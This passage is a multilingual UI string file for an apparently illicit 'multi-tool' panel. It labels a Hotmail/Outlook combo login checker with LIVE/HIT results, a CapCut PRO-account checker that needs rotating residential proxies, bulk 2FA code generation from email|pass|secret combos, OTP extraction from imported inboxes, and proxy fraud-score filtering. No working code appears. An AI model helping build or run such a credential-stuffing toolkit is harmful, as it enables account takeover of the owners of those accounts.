"PROXY", "prx_th_status": "TRẠNG THÁI", "prx_th_ping": "PING", "prx_th_loc": "IP THOÁT & VỊ TRÍ", "prx_th_isp": "NHÀ MẠNG / TỔ CHỨC", "prx_th_fraud": "ĐIỂM RỦI RO", "prx_th_act": "CHI TIẾT", "prx_empty_table": "Chưa kiểm tra proxy nào. Nhập danh sách và bấm <b>Bắt Đầu Kiểm Tra</b>.", "prx_no_match": "Không có proxy nào khớp bộ lọc.", "prx_modal_title": "Chi Tiết Chẩn Đoán Proxy", "prx_modal_close": "Đóng", "prx_alert_empty": "Vui lòng nhập danh sách proxy!", "prx_no_live_copy": "Không có proxy LIVE nào để sao chép.", "prx_no_live_dl": "Không có proxy LIVE nào để tải về.", "nav_menu": "Menu", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "zh": {"brand_sub": "多功能工具箱 • 社交媒体服务", "tab_mail": "邮箱检测器", "tab_capcut": "CapCut检测器", "tab_2fa": "2FA生成器", "tab_proxy": "代理检测器", "tm_accounts_title": "账号列表", "tm_clear_all_title": "清空所有账号", "tm_search_acc_ph": "搜索账号邮箱...", "tm_upload_txt": "上传 .TXT", "tm_upload_txt_title": "上传 .TXT 文件 (批量自动读取)", "tm_add_btn": "添加", "tm_add_btn_title": "手动添加账号", "tm_mode_search": "模式: 搜索邮箱", "tm_mode_all": "模式: 全部账号", "tm_show_all": "显示全部", "tm_search_only": "仅搜索模式", "tm_empty_acc_msg": "暂无账号。<br>上传 <b>.TXT</b> 文件或点击 <b>添加</b>。", "tm_inbox_title": "收件箱", "tm_btn_accounts": "账号", "tm_filter_msg_ph": "过滤发件人 / 主题...", "tm_empty_inbox_select": "请在左侧选择账号以查看收件箱消息。", "tm_active_email_placeholder": "选择账号", "tm_badge_standby": "● 待命", "tm_badge_connected": "● 已连接", "tm_badge_disconnected": "● 已断开", "tm_btn_copy": "复制", "tm_no_email_selected": "未选择邮件", "tm_click_inbox_hint": "点击收件箱列表中的邮件以阅读详细内容。", "tm_otp_detected": "已检测到验证码 / OTP", "tm_btn_copy_otp": "复制验证码", "tm_copied": "已复制!", "tm_search_another_title": "搜索其他账号", "tm_search_another_desc": "在上方搜索框输入邮箱以选取账号。", "tm_accounts_avail": "个可用账号", "tm_inbox_empty": "收件箱为空。", "tm_no_msg_filter": "没有符合过滤条件的消息。", "tm_no_acc_match": "未找到匹配账号", "tm_delete_acc_confirm": "确定从列表中删除 {email} 吗？", "tm_clear_all_confirm": "确定清空所有邮箱检测账号吗？", "tm_extracting": "正在提取并检测账号...", "tm_modal_add_title": "添加 Outlook / Hotmail 账号", "tm_modal_upload_label": "上传 .TXT 文件 (批量导入)", "tm_modal_paste_label": "或粘贴令牌 (email|pass|refresh_token|client_id 或仅token)", "tm_modal_proxy_label": "代理 (可选: http://user:pass@host:port)", "tm_modal_proxy_ph": "直接连接请留空", "tm_modal_btn_cancel": "取消", "tm_modal_btn_import": "导入并检测", "cc_card_title": "输入 CapCut 账号", "cc_acc_label": "账号列表 (email:pass, email|pass 等)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "住宅代理 URL (必填)", "cc_proxy_help": "使用 <code>{sess}</code> 变量实现自动轮换 IP。", "cc_threads_label": "线程数", "cc_retries_label": "IP重试次数", "cc_btn_start": "开始检测 CapCut", "cc_btn_stop": "停止", "cc_results_title": "CapCut 检测结果", "cc_pro_title": "PRO / VIP 会员", "cc_pro_ph": "PRO 账号将在此显示...", "cc_free_title": "FREE / 普通账号", "cc_free_ph": "FREE 账号将在此显示...", "cc_dead_title": "DEAD / 错误账号", "cc_dead_ph": "失败账号将在此显示...", "cc_btn_copy": "复制", "cc_btn_save": "保存", "cc_alert_empty": "请输入 CapCut 账号列表！", "cc_alert_no_valid": "未找到有效账号！", "tfa_single_title": "快捷 2FA 验证码 (单条)", "tfa_single_desc": "输入 2FA Secret Key (Base32) 即刻生成6位动态验证码。", "tfa_single_label": "2FA 密钥 (SECRET KEY)", "tfa_single_ph": "示例: JBSWY3DPEHPK3PXP", "tfa_btn_get": "获取验证码", "tfa_auth_code_label": "动态验证码", "tfa_btn_copy_code": "复制代码", "tfa_bulk_title": "批量 2FA 生成器", "tfa_bulk_desc": "支持批量粘贴密钥或组合行 (格式: <code>email|pass|secret</code> 或每行一个密钥)。", "tfa_bulk_label": "输入密钥列表 / 组合数据", "tfa_bulk_ph": "示例格式:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "批量生成所有验证码", "tfa_bulk_res_label": "生成结果 (组合格式 + 2FA 码)", "tfa_bulk_res_ph": "2FA 结果将在此显示...", "tfa_alert_empty_single": "请输入 2FA 密钥！", "tfa_alert_empty_bulk": "请输入密钥列表或组合数据！", "tfa_processing": "处理中...", "prx_title": "代理检测器", "prx_desc": "支持格式: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, 或 <code>scheme://...</code>", "prx_input_label": "输入代理列表", "prx_btn_sample": "示例", "prx_btn_clear": "清空", "prx_input_ph": "示例格式:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password", "prx_threads_label": "并发线程", "prx_timeout_label": "超时时间 (秒)", "prx_scamalytics_toggle": "Scamalytics 欺诈风险深度检测", "prx_btn_start": "开始检测", "prx_btn_stop": "停止", "prx_stat_total": "总数", "prx_stat_live": "存活 (LIVE)", "prx_stat_dead": "失效 (DEAD)", "prx_stat_latency": "平均延迟", "prx_stat_clean": "低风险 (<25)", "prx_filter_all": "全部", "prx_filter_live": "存活", "prx_filter_dead": "失效", "prx_filter_clean": "纯净 (低风险)", "prx_search_ph": "搜索 IP / 国家...", "prx_btn_export": "导出数据", "prx_exp_live_raw": "复制存活 (原始格式)", "prx_exp_live_ipport": "复制存活 (HOST:PORT)", "prx_exp_live_txt": "下载存活 (.TXT)", "prx_exp_report_json": "下载完整报告 (.JSON)", "prx_th_proxy": "代理地址", "prx_th_status": "状态", "prx_th_ping": "延迟", "prx_th_loc": "出口IP与归属地", "prx_th_isp": "运营商 / 组织", "prx_th_fraud": "欺诈评分", "prx_th_act": "详情", "prx_empty_table": "尚未检测任何代理。输入代理列表并点击 <b>开始检测</b>。", "prx_no_match": "没有匹配的代理数据。", "prx_modal_title": "代理诊断详情", "prx_modal_close": "关闭", "prx_alert_empty": "请输入代理列表！", "prx_no_live_copy": "没有存活的代理可供复制。", "prx_no_live_dl": "没有存活的代理可供下载。", "nav_menu": "菜单 (Menu)", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "ru": {"brand_sub": "МУЛЬТИ-ИНСТРУМЕНТЫ • SMM СЕРВИС", "tab_mail": "Чекер Почты", "tab_capcut": "Чекер CapCut", "tab_2fa": "Генератор 2FA", "tab_proxy": "Чекер Прокси", "tm_accounts_title": "Аккаунты", "tm_clear_all_title": "Удалить все аккаунты", "tm_search_acc_ph": "Поиск email аккаунта...", "tm_upload_txt": "Загрузить .TXT", "tm_upload_txt_title": "Загрузить файл .TXT (Массовый импорт)", "tm_add_btn": "Добавить", "tm_add_btn_title": "Добавить аккаунт вручную", "tm_mode_search": "Режим: Поиск Email", "tm_mode_all": "Режим: Все Аккаунты", "tm_show_all": "Показать все", "tm_search_only": "Только поиск", "tm_empty_acc_msg": "Нет аккаунтов.<br>Загрузите файл <b>.TXT</b> или нажмите <b>Добавить</b>.", "tm_inbox_title": "ВХОДЯЩИЕ", "tm_btn_accounts": "Аккаунты", "tm_filter_msg_ph": "Фильтр отправителя / темы...", "tm_empty_inbox_select": "Выберите аккаунт слева для просмотра входящих сообщений.", "tm_active_email_placeholder": "Выберите аккаунт", "tm_badge_standby": "● Ожидание", "tm_badge_connected": "● Подключено", "tm_badge_disconnected": "● Отключено", "tm_btn_copy": "Копировать", "tm_no_email_selected": "Письмо не выбрано", "tm_click_inbox_hint": "Нажмите на письмо в списке входящих, чтобы прочитать его.", "tm_otp_detected": "ОБНАРУЖЕН КОД ПОДТВЕРЖДЕНИЯ / OTP", "tm_btn_copy_otp": "Скопировать OTP", "tm_copied": "Скопировано!", "tm_search_another_title": "Найти другой аккаунт", "tm_search_another_desc": "Введите email в строке поиска выше, чтобы выбрать аккаунт.", "tm_accounts_avail": "Доступно аккаунтов", "tm_inbox_empty": "Входящие пусты.", "tm_no_msg_filter": "Нет сообщений, соответствующих фильтру.", "tm_no_acc_match": "Аккаунты не найдены", "tm_delete_acc_confirm": "Удалить {email} из списка?", "tm_clear_all_confirm": "Очистить все аккаунты чекера почты?", "tm_extracting": "Извлечение и проверка аккаунтов...", "tm_modal_add_title": "Добавить аккаунты Outlook / Hotmail", "tm_modal_upload_label": "ЗАГРУЗИТЬ ФАЙЛ .TXT (Массовый импорт)", "tm_modal_paste_label": "ИЛИ ВСТАВИТЬ ТОКЕНЫ (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "ПРОКСИ (Опционально: http://user:pass@host:port)", "tm_modal_proxy_ph": "Оставьте пустым для прямого соединения", "tm_modal_btn_cancel": "Отмена", "tm_modal_btn_import": "Импорт и проверка", "cc_card_title": "Ввод аккаунтов CapCut", "cc_acc_label": "СПИСОК АККАУНТОВ (email:pass, email|pass и т.д.)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL РЕЗИДЕНТСКИХ ПРОКСИ (Обязательно)", "cc_proxy_help": "Используйте <code>{sess}</code> для авто-ротации IP.", "cc_threads_label": "ПОТОКИ", "cc_retries_label": "ПОВТОРЫ IP", "cc_btn_start": "Начать проверку CapCut", "cc_btn_stop": "Стоп", "cc_results_title": "Результаты проверки CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "PRO аккаунты появятся здесь...", "cc_free_title": "FREE / ОБЫЧНЫЕ", "cc_free_ph": "FREE аккаунты появятся здесь...", "cc_dead_title": "DEAD / ОШИБКА", "cc_dead_ph": "Невалидные аккаунты появятся здесь...", "cc_btn_copy": "Копировать", "cc_btn_save": "Сохранить", "cc_alert_empty": "Пожалуйста, введите список аккаунтов CapCut!", "cc_alert_no_valid": "Валидные аккаунты не найдены!", "tfa_single_title": "Быстрый 2FA код (Одиночный)", "tfa_single_desc": "Введите 2FA Secret Key (Base32) для мгновенной генерации 6-значного кода.", "tfa_single_label": "СЕКРЕТНЫЙ КЛЮЧ 2FA", "tfa_single_ph": "Пример: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Получить код", "tfa_auth_code_label": "КОД АУТЕНТИФИКАЦИИ", "tfa_btn_copy_code": "Скопировать код", "tfa_bulk_title": "Массовый генератор 2FA", "tfa_bulk_desc": "Поддерживает вставку нескольких ключей или combo строк (формат <code>email|pass|secret</code>).", "tfa_bulk_label": "СПИСОК КЛЮЧЕЙ / COMBO", "tfa_bulk_ph": "Пример:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Сгенерировать все коды", "tfa_bulk_res_label": "РЕЗУЛЬТАТ (ФОРМАТ COMBO + 2FA КОД)", "tfa_bulk_res_ph": "Результаты 2FA появятся здесь...", "tfa_alert_empty_single": "Пожалуйста, введите секретный ключ 2FA!", "tfa_alert_empty_bulk": "Пожалуйста, введите список ключей или combo строк!", "tfa_processing": "Обработка...", "prx_title": "Чекер Прокси", "prx_desc": "Форматы: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, или <code>scheme://...</code>", "prx_input_label": "СПИСОК ПРОКСИ", "prx_btn_sample": "Пример", "prx_btn_clear": "Очистить", "prx_input_ph": "Пример:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "ПОТОКИ", "prx_timeout_label": "ТАЙМАУТ (сек)", "prx_scamalytics_toggle": "Глубокая проверка фрода Scamalytics", "prx_btn_start": "Начать проверку", "prx_btn_stop": "Стоп", "prx_stat_total": "ВСЕГО", "prx_stat_live": "ЖИВЫЕ (LIVE)", "prx_stat_dead": "МЕРТВЫЕ (DEAD)", "prx_stat_latency": "СР. ПИНГ", "prx_stat_clean": "НИЗКИЙ РИСК (<25)", "prx_filter_all": "Все", "prx_filter_live": "Живые", "prx_filter_dead": "Мертвые", "prx_filter_clean": "Чистые (<25)", "prx_search_ph": "Поиск IP / Страны...", "prx_btn_export": "Экспорт", "prx_exp_live_raw": "Копировать Live (Исходный формат)", "prx_exp_live_ipport": "Копировать Live (HOST:PORT)", "prx_exp_live_txt": "Скачать Live (.TXT)", "prx_exp_report_json": "Скачать полный отчет (.JSON)", "prx_th_proxy": "ПРОКСИ", "prx_th_status": "СТАТУС", "prx_th_ping": "ПИНГ", "prx_th_loc": "ВЫХОДНОЙ IP И ЛОКАЦИЯ", "prx_th_isp": "ПРОВАЙДЕР / ОРГ", "prx_th_fraud": "РИСК ФРОДА", "prx_th_act": "ИНФО", "prx_empty_table": "Прокси еще не проверены. Вставьте список и нажмите <b>Начать проверку</b>.", "prx_no_match": "Нет прокси, соответствующих фильтру.", "prx_modal_title": "Диагностика Прокси", "prx_modal_close": "Закрыть", "prx_alert_empty": "Пожалуйста, введите список прокси!", "prx_no_live_copy": "Нет LIVE прокси для копирования.", "prx_no_live_dl": "Нет LIVE прокси для скачивания.", "nav_menu": "Меню", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "es": {"brand_sub": "HERRAMIENTAS MÚLTIPLES • SERVICIOS SOCIALES", "tab_mail": "Verificador de Mail", "tab_capcut": "Verificador CapCut", "tab_2fa": "Generador 2FA", "tab_proxy": "Verificador de Proxy", "tm_accounts_title": "Cuentas", "tm_clear_all_title": "Borrar todas las cuentas", "tm_search_acc_ph": "Buscar correo de cuenta...", "tm_upload_txt": "Subir .TXT", "tm_upload_txt_title": "Subir archivo .TXT (Lectura masiva)", "tm_add_btn": "Añadir", "tm_add_btn_title": "Añadir cuenta manual", "tm_mode_search": "Modo: Buscar Correo", "tm_mode_all": "Modo: Todas las Cuentas", "tm_show_all": "Mostrar Todo", "tm_search_only": "Solo Buscar", "tm_empty_acc_msg": "Aún no hay cuentas.<br>Sube un archivo <b>.TXT</b> o pulsa <b>Añadir</b>.", "tm_inbox_title": "BANDEJA DE ENTRADA", "tm_btn_accounts": "Cuentas", "tm_filter_msg_ph": "Filtrar remitente / asunto...", "tm_empty_inbox_select": "Selecciona una cuenta a la izquierda para ver los mensajes.", "tm_active_email_placeholder": "Seleccionar Cuenta", "tm_badge_standby": "● En espera", "tm_badge_connected": "● Conectado", "tm_badge_disconnected": "● Desconectado", "tm_btn_copy": "Copiar", "tm_no_email_selected": "Ningún correo seleccionado", "tm_click_inbox_hint": "Haz clic en un correo de la lista para leer su contenido.", "tm_otp_detected": "CÓDIGO DE VERIFICACIÓN / OTP DETECTADO", "tm_btn_copy_otp": "Copiar OTP", "tm_copied": "¡Copiado!", "tm_search_another_title": "Buscar Otra Cuenta", "tm_search_another_desc": "Escribe el correo en el cuadro de búsqueda para elegir una cuenta.", "tm_accounts_avail": "Cuentas Disponibles", "tm_inbox_empty": "Bandeja vacía.", "tm_no_msg_filter": "No hay mensajes que coincidan con el filtro.", "tm_no_acc_match": "No se encontraron cuentas", "tm_delete_acc_confirm": "¿Eliminar {email} de la lista?", "tm_clear_all_confirm": "¿Borrar todas las cuentas del verificador?", "tm_extracting": "Extrayendo y verificando cuentas...", "tm_modal_add_title": "Añadir Cuentas Outlook / Hotmail", "tm_modal_upload_label": "SUBIR ARCHIVO .TXT (Importación Masiva)", "tm_modal_paste_label": "O PEGAR TOKENS (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Opcional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Dejar en blanco si es directo", "tm_modal_btn_cancel": "Cancelar", "tm_modal_btn_import": "Importar y Verificar", "cc_card_title": "Entrada de Cuentas CapCut", "cc_acc_label": "LISTA DE CUENTAS (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENCIAL (Obligatorio)", "cc_proxy_help": "Usa <code>{sess}</code> para rotación automática de IP.", "cc_threads_label": "HILOS", "cc_retries_label": "REINTENTOS IP", "cc_btn_start": "Iniciar Verificación CapCut", "cc_btn_stop": "Detener", "cc_results_title": "Resultados de Verificación CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Las cuentas PRO aparecerán aquí...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Las cuentas FREE aparecerán aquí...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Las cuentas fallidas aparecerán aquí...", "cc_btn_copy": "Copiar", "cc_btn_save": "Guardar", "cc_alert_empty": "¡Por favor ingresa la lista de cuentas CapCut!", "cc_alert_no_valid": "¡No se encontraron cuentas válidas!", "tfa_single_title": "Código 2FA Rápido (Individual)", "tfa_single_desc": "Ingresa la clave secreta 2FA (Base32) para obtener códigos instantáneos de 6 dígitos.", "tfa_single_label": "CLAVE SECRETA 2FA", "tfa_single_ph": "Ejemplo: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Obtener Código", "tfa_auth_code_label": "CÓDIGO DE AUTENTICACIÓN", "tfa_btn_copy_code": "Copiar Código", "tfa_bulk_title": "Generador 2FA Masivo", "tfa_bulk_desc": "Soporta pegar múltiples claves o líneas combo (formato <code>email|pass|secret</code>).", "tfa_bulk_label": "LISTA DE CLAVES / COMBOS", "tfa_bulk_ph": "Ejemplo:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Generar Todos los Códigos", "tfa_bulk_res_label": "RESULTADOS (FORMATO COMBO + CÓDIGO 2FA)", "tfa_bulk_res_ph": "Los códigos 2FA aparecerán aquí...", "tfa_alert_empty_single": "¡Por favor ingresa la clave secreta 2FA!", "tfa_alert_empty_bulk": "¡Por favor ingresa la lista de claves o combos!", "tfa_processing": "Procesando...", "prx_title": "Verificador de Proxy", "prx_desc": "Formatos: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, o <code>scheme://...</code>", "prx_input_label": "LISTA DE PROXIES", "prx_btn_sample": "Ejemplo", "prx_btn_clear": "Limpiar", "prx_input_ph": "Ejemplo:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "HILOS", "prx_timeout_label": "TIEMPO DE ESPERA (s)", "prx_scamalytics_toggle": "Verificación de Riesgo de Fraude Scamalytics", "prx_btn_start": "Iniciar Verificación", "prx_btn_stop": "Detener", "prx_stat_total": "TOTAL", "prx_stat_live": "VIVOS (LIVE)", "prx_stat_dead": "MUERTOS (DEAD)", "prx_stat_latency": "PING PROMEDIO", "prx_stat_clean": "BAJO FRAUDE (<25)", "prx_filter_all": "Todos", "prx_filter_live": "Vivos", "prx_filter_dead": "Muertos", "prx_filter_clean": "Bajo Fraude", "prx_search_ph": "Buscar IP / País...", "prx_btn_export": "Exportar", "prx_exp_live_raw": "Copiar Live (Formato Original)", "prx_exp_live_ipport": "Copiar Live (HOST:PORT)", "prx_exp_live_txt": "Descargar Live (.TXT)", "prx_exp_report_json": "Descargar Reporte Completo (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "ESTADO", "prx_th_ping": "PING", "prx_th_loc": "IP SALIDA Y UBICACIÓN", "prx_th_isp": "PROVEEDOR / ORG", "prx_th_fraud": "RIESGO FRAUDE", "prx_th_act": "DETALLES", "prx_empty_table": "No se han verificado proxies aún. Ingresa la lista y pulsa <b>Iniciar Verificación</b>.", "prx_no_match": "No hay proxies que coincidan con el filtro.", "prx_modal_title": "Detalles de Diagnóstico de Proxy", "prx_modal_close": "Cerrar", "prx_alert_empty": "¡Por favor ingresa la lista de proxies!", "prx_no_live_copy": "No hay proxies LIVE para copiar.", "prx_no_live_dl": "No hay proxies LIVE para descargar.", "nav_menu": "Menú", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "pt": {"brand_sub": "MULTI FERRAMENTAS • PAINEL SOCIAL", "tab_mail": "Verificador de E-mail", "tab_capcut": "Verificador CapCut", "tab_2fa": "Gerador 2FA", "tab_proxy": "Verificador de Proxy", "tm_accounts_title": "Contas", "tm_clear_all_title": "Limpar Todas as Contas", "tm_search_acc_ph": "Buscar e-mail da conta...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Enviar Arquivo .TXT (Importação em Massa)", "tm_add_btn": "Adicionar", "tm_add_btn_title": "Adicionar Conta Manualmente", "tm_mode_search": "Modo: Buscar E-mail", "tm_mode_all": "Modo: Todas as Contas", "tm_show_all": "Mostrar Todas", "tm_search_only": "Apenas Busca", "tm_empty_acc_msg": "Nenhuma conta ainda.<br>Envie um arquivo <b>.TXT</b> ou clique em <b>Adicionar</b>.", "tm_inbox_title": "CAIXA DE ENTRADA", "tm_btn_accounts": "Contas", "tm_filter_msg_ph": "Filtrar remetente / assunto...", "tm_empty_inbox_select": "Selecione uma conta à esquerda para ver os e-mails.", "tm_active_email_placeholder": "Selecionar Conta", "tm_badge_standby": "● Em espera", "tm_badge_connected": "● Conectado", "tm_badge_disconnected": "● Desconectado", "tm_btn_copy": "Copiar", "tm_no_email_selected": "Nenhum e-mail selecionado", "tm_click_inbox_hint": "Clique em um e-mail na lista para ler seu conteúdo.", "tm_otp_detected": "CÓDIGO DE VERIFICAÇÃO / OTP DETECTADO", "tm_btn_copy_otp": "Copiar OTP", "tm_copied": "Copiado!", "tm_search_another_title": "Buscar Outra Conta", "tm_search_another_desc": "Digite o e-mail na busca acima para selecionar uma conta.", "tm_accounts_avail": "Contas Disponíveis", "tm_inbox_empty": "Caixa de entrada vazia.", "tm_no_msg_filter": "Nenhuma mensagem corresponde ao filtro.", "tm_no_acc_match": "Nenhuma conta encontrada", "tm_delete_acc_confirm": "Remover {email} da lista?", "tm_clear_all_confirm": "Limpar todas as contas do verificador?", "tm_extracting": "Extraindo e verificando contas...", "tm_modal_add_title": "Adicionar Contas Outlook / Hotmail", "tm_modal_upload_label": "ENVIAR ARQUIVO .TXT (Importação em Massa)", "tm_modal_paste_label": "OU COLAR TOKENS (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Opcional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Deixe em branco se for conexão direta", "tm_modal_btn_cancel": "Cancelar", "tm_modal_btn_import": "Importar e Verificar", "cc_card_title": "Entrada de Contas CapCut", "cc_acc_label": "LISTA DE CONTAS (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENCIAL (Obrigatório)", "cc_proxy_help": "Use <code>{sess}</code> para rotação automática de IP.", "cc_threads_label": "THREADS", "cc_retries_label": "TENTATIVAS IP", "cc_btn_start": "Iniciar Checagem CapCut", "cc_btn_stop": "Parar", "cc_results_title": "Resultados de Checagem CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Contas PRO aparecerão aqui...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Contas FREE aparecerão aqui...", "cc_dead_title": "DEAD / ERRO", "cc_dead_ph": "Contas com erro aparecerão aqui...", "cc_btn_copy": "Copiar", "cc_btn_save": "Salvar", "cc_alert_empty": "Por favor, insira a lista de contas CapCut!", "cc_alert_no_valid": "Nenhuma conta válida encontrada!", "tfa_single_title": "Código 2FA Rápido (Individual)", "tfa_single_desc": "Insira a chave secreta 2FA (Base32) para gerar códigos de verificação de 6 dígitos instantaneamente.", "tfa_single_label": "CHAVE SECRETA 2FA", "tfa_single_ph": "Exemplo: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Obter Código", "tfa_auth_code_label": "CÓDIGO DE AUTENTICAÇÃO", "tfa_btn_copy_code": "Copiar Código", "tfa_bulk_title": "Gerador 2FA em Massa", "tfa_bulk_desc": "Suporta colar várias chaves ou linhas combo (formato <code>email|pass|secret</code>).", "tfa_bulk_label": "LISTA DE CHAVES / COMBOS", "tfa_bulk_ph": "Exemplo:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Gerar Todos os Códigos", "tfa_bulk_res_label": "RESULTADOS (FORMATO COMBO + CÓDIGO 2FA)", "tfa_bulk_res_ph": "Os códigos 2FA gerados aparecerão aqui...", "tfa_alert_empty_single": "Por favor, insira a chave secreta 2FA!", "tfa_alert_empty_bulk": "Por favor, insira a lista de chaves ou combos!", "tfa_processing": "Processando...", "prx_title": "Verificador de Proxy", "prx_desc": "Formatos: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, ou <code>scheme://...</code>", "prx_input_label": "LISTA DE PROXIES", "prx_btn_sample": "Exemplo", "prx_btn_clear": "Limpar", "prx_input_ph": "Exemplo:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Verificação de Score de Fraude Scamalytics", "prx_btn_start": "Iniciar Checagem", "prx_btn_stop": "Parar", "prx_stat_total": "TOTAL", "prx_stat_live": "VIVOS (LIVE)", "prx_stat_dead": "MORTOS (DEAD)", "prx_stat_latency": "PING MÉDIO", "prx_stat_clean": "BAIXO RISCO (<25)", "prx_filter_all": "Todos", "prx_filter_live": "Vivos", "prx_filter_dead": "Mortos", "prx_filter_clean": "Baixo Risco", "prx_search_ph": "Buscar IP / País...", "prx_btn_export": "Exportar", "prx_exp_live_raw": "Copiar Live (Formato Original)", "prx_exp_live_ipport": "Copiar Live (HOST:PORT)", "prx_exp_live_txt": "Baixar Live (.TXT)", "prx_exp_report_json": "Baixar Relatório Completo (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", 